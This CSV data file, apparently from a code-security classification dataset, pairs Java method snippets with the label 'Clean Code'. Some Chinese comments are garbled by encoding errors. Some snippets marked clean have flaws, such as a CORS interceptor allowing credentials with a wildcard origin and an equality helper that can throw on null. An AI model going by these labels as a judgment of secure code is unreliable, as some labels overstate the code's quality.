text,label,text_label
"public void close(){
  if (this != null) {
    Connection connection=this.getConnection();
    try {
      if (connection != null && !connection.isClosed()) {
        connection.close();
      }
    }
 catch (    SQLException e) {
    }
    com.jcraft.jsch.Session session=this.getSession();
    if (session != null && session.isConnected() && this.getSsh() != null && this.getSsh().isUse()) {
      try {
        session.delPortForwardingL(Integer.parseInt(this.getSsh().getLocalPort()));
      }
 catch (      JSchException e) {
      }
    }
  }
}
",0,Clean Code
"/** 
 * 鏂板璧勬簮瀵艰埅
 * @param resourceNavigateDTO
 * @param currentUser
 * @return
 */
@Override public Boolean create(ResourceNavigateDTO resourceNavigateDTO,UserSsoDTO currentUser){
  if (StringUtils.isBlank(resourceNavigateDTO.getResourceName()) || StringUtils.isBlank(resourceNavigateDTO.getCategory()) || StringUtils.isBlank(resourceNavigateDTO.getDesc())|| StringUtils.isBlank(resourceNavigateDTO.getLink())) {
    throw BusinessException.build(ResponseCode.NOT_EXISTS,""鍙傛暟涓嶅悎瑙�"");
  }
  if (isNameExist(null,resourceNavigateDTO.getResourceName())) {
    throw BusinessException.build(ResponseCode.NAME_EXIST,""璧勬簮瀵艰埅鍚嶉噸澶�"");
  }
  resourceNavigateDTO.setIsDeleted(false);
  resourceNavigateDTO.setCreateUser(currentUser.getUserId());
  resourceNavigateDTO.setUpdateUser(currentUser.getUserId());
  LocalDateTime now=LocalDateTime.now();
  resourceNavigateDTO.setCreateTime(now);
  resourceNavigateDTO.setUpdateTime(now);
  ResourceNavigatePo resourceNavigatePo=ResourceNavigateMS.INSTANCE.toPo(resourceNavigateDTO);
  if (resourceNavigatePoMapper.insertSelective(resourceNavigatePo) <= 0) {
    throw BusinessException.build(ResponseCode.OPERATE_FAIL,""鏂板璧勬簮瀵艰埅澶辫触"");
  }
  return true;
}",0,Clean Code
"@PostMapping(value={""/api/test/suggestion/provide""},produces=MediaType.APPLICATION_JSON_VALUE) public Result saveGPTSuggestion(@CurrentSecurityContext SysUser requestor,@RequestParam(value=""id"",defaultValue="""") String id,@RequestParam(value=""suggestion"",defaultValue="""") String suggestion,@RequestParam(value=""type"",defaultValue="""") String type){
  if (requestor == null) {
    return Result.error(HttpStatus.UNAUTHORIZED.value(),""unauthorized"");
  }
  if (StringUtils.isEmpty(id) || StringUtils.isEmpty(suggestion) || StringUtils.isEmpty(type)) {
    return Result.error(HttpStatus.BAD_REQUEST.value(),""Error param! Should not be empty"");
  }
  TestDataService.SuggestionType suggestionType;
  try {
    suggestionType=TestDataService.SuggestionType.valueOf(type);
  }
 catch (  IllegalArgumentException e) {
    return Result.error(HttpStatus.BAD_REQUEST.value(),""Error param! Suggestion type not exist"");
  }
  try {
    saveGPTSuggestion(id,suggestion,suggestionType);
  }
 catch (  HydraLabRuntimeException e) {
    return Result.error(e.getCode(),e.getMessage());
  }
  return Result.ok(""Save suggestion success!"");
}
!org.eclipse.jdt.core.dom.MethodDeclaration@18fb7e4",0,Clean Code
"@ParameterizedTest(name=""{0} : {displayName} "") @ValueSource(strings={""COSINE"",""L2"",""IP""}) public void documentUpdate(String metricType){
  contextRunner.withPropertyValues(""test.spring.ai.vectorstore.milvus.metricType="" + metricType).run(context -> {
    VectorStore vectorStore=context.getBean(VectorStore.class);
    resetCollection(vectorStore);
    Document document=new Document(UUID.randomUUID().toString(),""Spring AI rocks!!"",Collections.singletonMap(""meta1"",""meta1""));
    vectorStore.add(List.of(document));
    List<Document> results=vectorStore.similaritySearch(SearchRequest.query(""Spring"").withTopK(5));
    assertThat(results).hasSize(1);
    Document resultDoc=results.get(0);
    assertThat(resultDoc.getId()).isEqualTo(document.getId());
    assertThat(resultDoc.getContent()).isEqualTo(""Spring AI rocks!!"");
    assertThat(resultDoc.getMetadata()).containsKey(""meta1"");
    assertThat(resultDoc.getMetadata()).containsKey(""distance"");
    Document sameIdDocument=new Document(document.getId(),""The World is Big and Salvation Lurks Around the Corner"",Collections.singletonMap(""meta2"",""meta2""));
    vectorStore.add(List.of(sameIdDocument));
    results=vectorStore.similaritySearch(SearchRequest.query(""FooBar"").withTopK(5));
    assertThat(results).hasSize(1);
    resultDoc=results.get(0);
    assertThat(resultDoc.getId()).isEqualTo(document.getId());
    assertThat(resultDoc.getContent()).isEqualTo(""The World is Big and Salvation Lurks Around the Corner"");
    assertThat(resultDoc.getMetadata()).containsKey(""meta2"");
    assertThat(resultDoc.getMetadata()).containsKey(""distance"");
    vectorStore.delete(List.of(document.getId()));
  }
);
}",0,Clean Code
"public void moveLegend(float offset){
  if (chartData == null || selectedIndex == -1 || !legendShowing)   return;
  legendSignatureView.setData(selectedIndex,chartData.x[selectedIndex],(ArrayList<LineViewData>)lines,false);
  legendSignatureView.setVisibility(VISIBLE);
  legendSignatureView.measure(MeasureSpec.makeMeasureSpec(getMeasuredWidth(),MeasureSpec.AT_MOST),MeasureSpec.makeMeasureSpec(getMeasuredHeight(),MeasureSpec.AT_MOST));
  float lXPoint=chartData.xPercentage[selectedIndex] * chartFullWidth - offset;
  if (lXPoint > (chartStart + chartWidth) / 2f) {
    lXPoint-=(legendSignatureView.getWidth() + DP_5);
  }
 else {
    lXPoint+=DP_5;
  }
  if (lXPoint < 0) {
    lXPoint=0;
  }
 else   if (lXPoint + legendSignatureView.getMeasuredWidth() > getMeasuredWidth()) {
    lXPoint=getMeasuredWidth() - legendSignatureView.getMeasuredWidth();
  }
  legendSignatureView.setTranslationX(lXPoint);
}
public void moveLegend(){
  moveLegend(chartFullWidth * (pickerDelegate.pickerStart) - HORIZONTAL_PADDING);
}",0,Clean Code
"/** 
 * <code>optional .LineupInfo lineup = 7;</code>
 * @return this
 */
public ChessRogueInfo clearLineup(){
  bitField0_&=~0x00000002;
  lineup.clear();
  return this;
}",0,Clean Code
"public List<Expression> expressions(){
  return expressions;
}
",0,Clean Code
"public void freeZyLibVisibilityListeners(){
  for (  final InternalGraphVisibilityListener listener : savedVisibilityListeners) {
    if (listener == null) {
      continue;
    }
    listener.getGraph().addListener(listener);
  }
}
",0,Clean Code
"@AfterAll public static void afterAll(){
  evaluator.close();
}
",0,Clean Code
"protected void setFiatBalance(FiatLabel fiatLabel,CurrencyRate currencyRate,long balance){
  if (currencyRate != null && currencyRate.isAvailable() && balance > 0) {
    fiatLabel.set(currencyRate,balance);
  }
 else {
    fiatLabel.setCurrency(null);
    fiatLabel.setBtcRate(0.0);
  }
}",0,Clean Code
"@Override public SyncRogueBuffSelectInfoScNotify create(){
  return SyncRogueBuffSelectInfoScNotify.newInstance();
}
",0,Clean Code
"private static void taskFinish(String taskId,String taskType){
  try {
    String s=AntBookReadRpcCall.taskFinish(taskId,taskType);
    JSONObject jo=new JSONObject(s);
    if (jo.getBoolean(""success"")) {
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""taskFinish err:"");
    Log.printStackTrace(TAG,t);
  }
}
",0,Clean Code
"/** 
 * @return cql query statement to retrieve all event executions for a given message and eventhandler from the ""event_executions"" table
 */
public String getSelectAllEventExecutionsForMessageFromEventExecutionsStatement(){
  return QueryBuilder.select().all().from(keyspace,TABLE_EVENT_EXECUTIONS).where(eq(MESSAGE_ID_KEY,bindMarker())).and(eq(EVENT_HANDLER_NAME_KEY,bindMarker())).getQueryString();
}
",0,Clean Code
"@Override public void onQueue(@Nullable Object message){
  if (mQueueNotificationManager == null || mQueueNotificationManagerInfo == null || message == null) {
    return;
  }
  NotificationInfo info=(NotificationInfo)message;
  Notification notification=info.getBuilder(mContext,mQueueNotificationManagerInfo).setLocalOnly(true).build();
  notify(mContext,mQueueNotificationManager,TAG_QUEUE,NotificationUtils.nextNotificationId(TAG_QUEUE),notification);
}
",0,Clean Code
"private <J2 extends J>JRightPadded<J2> minimumLines(JRightPadded<J2> tree,int min){
  return tree.withElement(minimumLines(tree.getElement(),min));
}
private <J2 extends J>J2 minimumLines(J2 tree,int min){
  return tree.withPrefix(minimumLines(tree.getPrefix(),min));
}
private Space minimumLines(Space prefix,int min){
  if (min == 0) {
    return prefix;
  }
  if (prefix.getComments().isEmpty() || prefix.getWhitespace().contains(""\n"") || prefix.getComments().get(0) instanceof Javadoc|| (prefix.getComments().get(0).isMultiline() && prefix.getComments().get(0).printComment(getCursor()).contains(""\n""))) {
    return prefix.withWhitespace(minimumLines(prefix.getWhitespace(),min));
  }
  return prefix.withComments(ListUtils.map(prefix.getComments(),(i,c) -> i == 0 ? c.withSuffix(minimumLines(c.getSuffix(),min)) : c));
}
public static String minimumLines(String whitespace,int min){
  if (min == 0) {
    return whitespace;
  }
  String minWhitespace=whitespace;
  for (int i=0; i < min - getNewLineCount(whitespace) + 1; i++) {
    minWhitespace=""\n"" + minWhitespace;
  }
  return minWhitespace;
}",0,Clean Code
"/** 
 * Returns the record canonical constructor. 
 */
public static Tuple2<Constructor,MethodHandle> getRecordConstructor(Class<?> cls){
  return ctrCache.get(cls);
}",0,Clean Code
"/** 
 * 璐拱杞︾エ
 * @param requestParam 杞︾エ璐拱璇锋眰鍙傛暟
 * @return 璁㈠崟鍙�
 */
TicketPurchaseRespDTO purchaseTicketsV1(@RequestBody PurchaseTicketReqDTO requestParam);",0,Clean Code
"@Test void should_retrieve_with_custom_dynamicMinScore_builder(){
  ContentRetriever contentRetriever=EmbeddingStoreContentRetriever.builder().embeddingStore(EMBEDDING_STORE).embeddingModel(EMBEDDING_MODEL).dynamicMinScore((query) -> CUSTOM_MIN_SCORE).build();
  contentRetriever.retrieve(QUERY);
  verify(EMBEDDING_STORE).search(EmbeddingSearchRequest.builder().queryEmbedding(EMBEDDING).maxResults(DEFAULT_MAX_RESULTS).minScore(CUSTOM_MIN_SCORE).build());
  verifyNoMoreInteractions(EMBEDDING_STORE);
}
",0,Clean Code
"/** 
 * <code>optional bool pool_refreshed = 13;</code>
 * @return this
 */
public RogueScoreRewardInfo clearPoolRefreshed(){
  bitField0_&=~0x00000020;
  poolRefreshed=false;
  return this;
}",0,Clean Code
"@ParameterizedTest @CsvSource({""0,false,false"",""90,false,false"",""180,false,false"",""270,false,false"",""0,true,false"",""0,false,true"",""0,true,true""}) void testOverlappingHoles(int degrees,boolean flipX,boolean flipY) throws GeometryException {
  MutableCoordinateSequence outer=new MutableCoordinateSequence();
  outer.addPoint(1,1);
  outer.addPoint(10,1);
  outer.addPoint(10,10);
  outer.addPoint(1,10);
  outer.closeRing();
  MutableCoordinateSequence inner1=new MutableCoordinateSequence();
  inner1.addPoint(2,2);
  inner1.addPoint(2,9);
  inner1.addPoint(9,9);
  inner1.addPoint(3,5);
  inner1.addPoint(9,2);
  inner1.closeRing();
  MutableCoordinateSequence inner2=new MutableCoordinateSequence();
  inner2.addPoint(9,3);
  inner2.addPoint(9,8);
  inner2.addPoint(4,5);
  inner2.closeRing();
  flipAndRotate(outer,6,6,flipX,flipY,degrees);
  flipAndRotate(inner1,6,6,flipX,flipY,degrees);
  flipAndRotate(inner2,6,6,flipX,flipY,degrees);
  testRender(List.of(List.of(outer,inner1)));
  testRender(List.of(List.of(outer,inner2)));
  testRender(List.of(List.of(outer,inner1,inner2)));
  var result=testRender(List.of(List.of(outer,inner2,inner1)));
  if (degrees == 0 && !flipX && !flipY) {
    assertFalse(result.getCoveredTiles().test(7,4));
    assertFalse(result.getCoveredTiles().test(3,3));
    assertTrue(result.getCoveredTiles().test(1,1));
    assertTrue(result.getCoveredTiles().test(9,9));
  }
}",0,Clean Code
"@Override protected void dispatchDraw(Canvas canvas){
  canvas.save();
  circlePath.rewind();
  circlePath.addCircle(getWidth() / 2f,getHeight() / 2f,Math.min(getWidth() / 2f,getHeight() / 2f),Path.Direction.CW);
  canvas.clipPath(circlePath);
  super.dispatchDraw(canvas);
  canvas.restore();
}
@Override protected void dispatchDraw(Canvas canvas){
  AndroidUtilities.rectTmp.set(cameraView.getX() + cameraView.getWidth() / 2f * (1f - cameraView.getScaleX()),cameraView.getY() + cameraView.getHeight() / 2f * (1f - cameraView.getScaleY()),cameraView.getX() + cameraView.getWidth() - cameraView.getWidth() / 2f * (1f - cameraView.getScaleX()),cameraView.getY() + cameraView.getHeight() - cameraView.getHeight() / 2f * (1f - cameraView.getScaleY()));
  shadowPaint.setShadowLayer(dp(2),0,dp(.66f),Theme.multAlpha(0x20000000,alpha));
  shadowPaint.setAlpha((int)(0xff * alpha));
  canvas.drawCircle(AndroidUtilities.rectTmp.centerX(),AndroidUtilities.rectTmp.centerY(),Math.min(AndroidUtilities.rectTmp.width() / 2f,AndroidUtilities.rectTmp.height() / 2f) - 1,shadowPaint);
  super.dispatchDraw(canvas);
  if (roundView != null && roundView.getWidth() > 0 && roundView.getHeight() > 0) {
    canvas.save();
    canvas.translate(AndroidUtilities.rectTmp.left,AndroidUtilities.rectTmp.top);
    canvas.scale(AndroidUtilities.rectTmp.width() / roundView.getWidth(),AndroidUtilities.rectTmp.height() / roundView.getHeight());
    float wasAlpha=roundView.getAlpha();
    roundView.setDraw(true);
    roundView.setAlpha(1f - alpha);
    roundView.draw(canvas);
    roundView.setAlpha(wasAlpha);
    roundView.setDraw(false);
    canvas.restore();
  }
  if (recordingStarted > 0) {
    float t=Utilities.clamp(sinceRecording() / (float)MAX_DURATION,1,0);
    progressPaint.setStrokeWidth(dp(3.33f));
    progressPaint.setColor(Theme.multAlpha(0xbeffffff,alpha));
    progressPaint.setShadowLayer(dp(1),0,dp(.33f),Theme.multAlpha(0x20000000,alpha));
    AndroidUtilities.rectTmp.inset(-dp(3.33f / 2f + 6),-dp(3.33f / 2f + 6));
    canvas.drawArc(AndroidUtilities.rectTmp,-90f,360f * t,false,progressPaint);
    if (recordingStopped <= 0)     invalidate();
  }
}",0,Clean Code
"public static FBSSample getRootAsFBSSample(ByteBuffer _bb){
  return getRootAsFBSSample(_bb,new FBSSample());
}
public static FBSSample getRootAsFBSSample(ByteBuffer _bb,FBSSample obj){
  _bb.order(ByteOrder.LITTLE_ENDIAN);
  return (obj.__assign(_bb.getInt(_bb.position()) + _bb.position(),_bb));
}
",0,Clean Code
"public MethodReference addMethodRef(SootMethodRef sootMethodRef){
  SootClass cls=sootMethodRef.getDeclaringClass();
  SootMethod method=SemanticUtils.getMethod(sootMethodRef);
  return addMethodRef(cls,method);
}
public MethodReference addMethodRef(SootClass cls,SootMethod method){
  MethodReference methodRef=null;
  ClassReference classRef=getClassRefByName(cls.getName());
  if (classRef == null) {
    ClassInfoCollector.collectRuntimeForSingleClazz(cls.getName(),true,this,null);
    methodRef=getMethodRefBySignature(method.getSignature(),true);
  }
 else   if (method != null && (""soot.dummy.InvokeDynamic"".equals(cls.getName()) || cls.getName().contains(""$lambda_"") || method.isNative())) {
    methodRef=ClassInfoCollector.collectSingleMethodRef(classRef,method,false,false,this,GlobalConfiguration.rulesContainer);
  }
 else   if (method != null) {
    methodRef=ClassInfoCollector.collectSingleMethodRef(classRef,method,true,true,this,GlobalConfiguration.rulesContainer);
  }
  return methodRef;
}
",0,Clean Code
"public GProBusinessInfo getBusinessInfo(){
  return this.businessInfo;
}
",0,Clean Code
"void onRecvMsg(ArrayList<MsgRecord> arrayList);
",0,Clean Code
"public static String toStringBinary(final byte[] b){
  if (b == null) {
    return ""null"";
  }
  return toStringBinary(b,0,b.length);
}
public static String toStringBinary(final byte[] b,int off,int len){
  StringBuilder result=new StringBuilder();
  String first=new String(b,off,len,StandardCharsets.ISO_8859_1);
  for (int i=0; i < first.length(); ++i) {
    int ch=first.charAt(i) & 0xFF;
    if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z')|| "" `~!@#$%^&*()-_=+[]{}\\|;:'\"",.<>/?"".indexOf(ch) >= 0) {
      result.append(first.charAt(i));
    }
 else {
      result.append(String.format(""\\x%02X"",ch));
    }
  }
  return result.toString();
}",0,Clean Code
"public boolean isKeyTypeFinal(){
  return isKeyTypeFinal;
}
",0,Clean Code
"public void checkIsEligible(boolean force,Utilities.Callback<TL_smsjobs.TL_smsjobs_eligibleToJoin> whenDone){
  if (loadedIsEligible && !force || loadingIsEligible && whenDone == null)   return;
  loadingIsEligible=true;
  ConnectionsManager.getInstance(currentAccount).sendRequest(new TL_smsjobs.TL_smsjobs_isEligibleToJoin(),(res,err) -> AndroidUtilities.runOnUIThread(() -> {
    loadingIsEligible=false;
    loadedIsEligible=true;
    if (res instanceof TL_smsjobs.TL_smsjobs_eligibleToJoin) {
      isEligible=(TL_smsjobs.TL_smsjobs_eligibleToJoin)res;
    }
 else     if (err != null && ""NOT_ELIGIBLE"".equals(err.text)) {
      isEligible=null;
    }
 else     if (err != null && ""ALREADY_JOINED"".equals(err.text)) {
      isEligible=null;
    }
 else     if (err != null) {
      BulletinFactory.showError(err);
    }
    NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.mainUserInfoChanged);
    NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.smsJobStatusUpdate);
    if (whenDone != null) {
      whenDone.run(isEligible);
    }
  }
));
}
",0,Clean Code
"@Override public boolean preHandle(HttpServletRequest request,HttpServletResponse response,Object handler) throws Exception {
  addOriginList();
  String origin=request.getHeader(""Origin"");
  boolean embedded=StringUtils.startsWithAny(request.getRequestURI(),""/assets/"",""/js/"");
  if ((StringUtils.isNotBlank(origin) && originList.contains(origin)) || busiOriginList.contains(origin) || embedded) {
    response.setHeader(""Access-Control-Allow-Origin"",embedded ? ""*"" : origin);
    response.setHeader(""Access-Control-Allow-Credentials"",""true"");
    response.setHeader(""Access-Control-Allow-Methods"",""GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS"");
    response.setHeader(""Access-Control-Allow-Headers"",""*"");
    response.setHeader(""Access-Control-Max-Age"",""3600"");
  }
  if (StringUtils.equalsIgnoreCase(request.getMethod(),""options"")) {
    response.setStatus(200);
    return false;
  }
  return true;
}",0,Clean Code
"@Override public GeneratorElementNode visitObjectElement(ObjectElementContext ctx){
  var member=doVisitObjectElement(ctx);
  insertWriteForGeneratorVarsToFrameSlotsNode(member.getMemberNode());
  return GeneratorElementNodeGen.create(member);
}
",0,Clean Code
"public long getRecallTime(){
  return this.recallTime;
}
",0,Clean Code
"private double aggregatedScore(double meanScore,double maxScore){
  return (meanToMaxScoreRatio * meanScore) + ((1 - meanToMaxScoreRatio) * maxScore);
}",0,Clean Code
"@Override public ActionBar createActionBar(Context context){
  BaseFragment lastFragment=parentLayout.getLastFragment();
  if (lastFragment instanceof ChatActivity && ((ChatActivity)lastFragment).themeDelegate != null && ((ChatActivity)lastFragment).themeDelegate.getCurrentTheme() != null) {
    resourcesProvider=lastFragment.getResourceProvider();
  }
  ActionBar actionBar=new ActionBar(context,resourcesProvider){
    @Override public boolean onTouchEvent(    MotionEvent event){
      avatarContainer.getHitRect(rect);
      if (rect.contains((int)event.getX(),(int)event.getY())) {
        return false;
      }
      return super.onTouchEvent(event);
    }
    @Override public void setItemsColor(    int color,    boolean isActionMode){
      super.setItemsColor(color,isActionMode);
      if (!isActionMode && ttlIconView != null) {
        ttlIconView.setColorFilter(new PorterDuffColorFilter(color,PorterDuff.Mode.MULTIPLY));
      }
    }
  }
;
  actionBar.setColorFilterMode(PorterDuff.Mode.SRC_IN);
  actionBar.setForceSkipTouches(true);
  actionBar.setBackgroundColor(Color.TRANSPARENT);
  actionBar.setItemsBackgroundColor(getThemedColor(Theme.key_avatar_actionBarSelectorBlue),false);
  actionBar.setItemsColor(getThemedColor(Theme.key_actionBarDefaultIcon),false);
  actionBar.setBackButtonDrawable(new BackDrawable(false));
  actionBar.setCastShadows(false);
  actionBar.setAddToContainer(false);
  actionBar.setClipContent(true);
  actionBar.setOccupyStatusBar(Build.VERSION.SDK_INT >= 21 && !AndroidUtilities.isTablet() && !inBubbleMode);
  ImageView backButton=actionBar.getBackButton();
  backButton.setOnLongClickListener(e -> {
    ActionBarPopupWindow menu=BackButtonMenu.show(this,backButton,getDialogId(),getTopicId(),resourcesProvider);
    if (menu != null) {
      menu.setOnDismissListener(() -> dimBehindView(false));
      dimBehindView(backButton,0.3f);
      if (undoView != null) {
        undoView.hide(true,1);
      }
      return true;
    }
 else {
      return false;
    }
  }
);
  return actionBar;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(starCount);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(reward);
  }
  return size;
}",0,Clean Code
"static boolean same3(Object a,Object b){
  if ((a == null && b == null) || a.equals(b))   return true;
 else   return false;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(slot);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(id);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeEnumSizeNoTag(avatarType);
  }
  return size;
}",0,Clean Code
"@Override public int numFields(){
  return numFields;
}
",0,Clean Code
"String getChannleId();
",0,Clean Code
"public static FEKit getInstance(){
  return null;
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof RogueBuffRollInfo)) {
    return false;
  }
  RogueBuffRollInfo other=(RogueBuffRollInfo)o;
  return true;
}
",0,Clean Code
"/** 
 * @return factory for creating SpBarInfo messages
 */
public static MessageFactory<SpBarInfo> getFactory(){
  return SpBarInfoFactory.INSTANCE;
}
",0,Clean Code
"public String readJavaString(MemoryBuffer buffer){
  if (STRING_VALUE_FIELD_IS_BYTES) {
    return readBytesString(buffer);
  }
 else {
    assert STRING_VALUE_FIELD_IS_CHARS;
    if (compressString) {
      return readCompressedCharsString(buffer);
    }
 else {
      return newCharsStringZeroCopy(buffer.readCharsAndSize());
    }
  }
}
",0,Clean Code
"public boolean isBeanPriorityLoadEnable(){
  return beanPriorityLoadEnable;
}
",0,Clean Code
"protected synchronized void removeUnusedLiveDanmakusIn(final int msec){
  if (danmakuList == null || danmakuList.isEmpty() || mLiveDanmakus.isEmpty())   return;
  mLiveDanmakus.forEachSync(new IDanmakus.DefaultConsumer<BaseDanmaku>(){
    long startTime=SystemClock.uptimeMillis();
    @Override public int accept(    BaseDanmaku danmaku){
      boolean isTimeout=danmaku.isTimeOut();
      if (SystemClock.uptimeMillis() - startTime > msec) {
        return ACTION_BREAK;
      }
      if (isTimeout) {
        danmakuList.removeItem(danmaku);
        onDanmakuRemoved(danmaku);
        return ACTION_REMOVE;
      }
 else {
        return ACTION_BREAK;
      }
    }
  }
);
}
",0,Clean Code
"public void backFromHere(){
  if (currentUI == uiStartGame || currentUI == null) {
    OldMainActivity.CURRENT_ACTIVITY.get().finish();
  }
  if (currentUI == uiGamedir || currentUI == uiGamelist || currentUI == uiLauncherSetting || currentUI == uiUser || currentUI == uiPlugin || currentUI == uiLog) {
    switchUIs(uiStartGame,mContext.getString(R.string.title_home));
  }
  if (currentUI == uiGameSetting || currentUI == uiInstallVersion) {
    switchUIs(uiGamelist,mContext.getString(R.string.title_game_list));
  }
}
",0,Clean Code
"@Test void should_support_EXTRACT(){
  assertThat(parser.parse(""year = EXTRACT(YEAR FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""year"").isEqualTo(currentYear()));
  assertThat(parser.parse(""year = EXTRACT(YEAR FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""year"").isEqualTo(currentYear()));
  assertThat(parser.parse(""year = EXTRACT(YEAR FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""year"").isEqualTo(currentYear()));
  assertThat(parser.parse(""month = EXTRACT(MONTH FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""month"").isEqualTo(currentMonth()));
  assertThat(parser.parse(""month = EXTRACT(MONTH FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""month"").isEqualTo(currentMonth()));
  assertThat(parser.parse(""month = EXTRACT(MONTH FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""month"").isEqualTo(currentMonth()));
  assertThat(parser.parse(""week = EXTRACT(WEEK FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""week"").isEqualTo(currentWeek()));
  assertThat(parser.parse(""week = EXTRACT(WEEK FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""week"").isEqualTo(currentWeek()));
  assertThat(parser.parse(""week = EXTRACT(WEEK FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""week"").isEqualTo(currentWeek()));
  assertThat(parser.parse(""day = EXTRACT(DAY FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""day"").isEqualTo(currentDayOfMonth()));
  assertThat(parser.parse(""day = EXTRACT(DAY FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""day"").isEqualTo(currentDayOfMonth()));
  assertThat(parser.parse(""day = EXTRACT(DAY FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""day"").isEqualTo(currentDayOfMonth()));
  assertThat(parser.parse(""dow = EXTRACT(DOW FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""dow"").isEqualTo(currentDayOfWeek()));
  assertThat(parser.parse(""dow = EXTRACT(DOW FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""dow"").isEqualTo(currentDayOfWeek()));
  assertThat(parser.parse(""dow = EXTRACT(DOW FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""dow"").isEqualTo(currentDayOfWeek()));
  assertThat(parser.parse(""doy = EXTRACT(DOY FROM CURRENT_DATE)"")).isEqualTo(metadataKey(""doy"").isEqualTo(currentDayOfYear()));
  assertThat(parser.parse(""doy = EXTRACT(DOY FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""doy"").isEqualTo(currentDayOfYear()));
  assertThat(parser.parse(""doy = EXTRACT(DOY FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""doy"").isEqualTo(currentDayOfYear()));
  assertThat(parser.parse(""hour = EXTRACT(HOUR FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""hour"").isEqualTo(currentHour()));
  assertThat(parser.parse(""hour = EXTRACT(HOUR FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""hour"").isEqualTo(currentHour()));
  assertThat(parser.parse(""minute = EXTRACT(MINUTE FROM CURRENT_TIME)"")).isEqualTo(metadataKey(""minute"").isEqualTo(currentMinute()));
  assertThat(parser.parse(""minute = EXTRACT(MINUTE FROM CURRENT_TIMESTAMP)"")).isEqualTo(metadataKey(""minute"").isEqualTo(currentMinute()));
}
",0,Clean Code
"public static void openBoostsForUsers(BaseFragment baseFragment,boolean isCurrentChat,long dialogId,ChannelBoostsController.CanApplyBoost canApplyBoost,TL_stories.TL_premium_boostsStatus boostsStatus,ChatMessageCell chatMessageCell){
  if (baseFragment == null || canApplyBoost == null || boostsStatus == null || baseFragment.getContext() == null) {
    return;
  }
  LimitReachedBottomSheet limitReachedBottomSheet=new LimitReachedBottomSheet(baseFragment,baseFragment.getContext(),TYPE_BOOSTS_FOR_USERS,baseFragment.getCurrentAccount(),baseFragment.getResourceProvider());
  limitReachedBottomSheet.setCanApplyBoost(canApplyBoost);
  limitReachedBottomSheet.setBoostsStats(boostsStatus,isCurrentChat);
  limitReachedBottomSheet.setDialogId(dialogId);
  limitReachedBottomSheet.setChatMessageCell(chatMessageCell);
  baseFragment.showDialog(limitReachedBottomSheet);
}
",0,Clean Code
"/** 
 * 淇敼绯荤当閰嶇疆
 * @param adminConfig 閰嶇疆瀹炰綋
 * @return data
 */
@PostMapping(value=""/adminConfig/updateAdminConfig"") Result updateAdminConfig(@RequestBody AdminConfig adminConfig);
",0,Clean Code
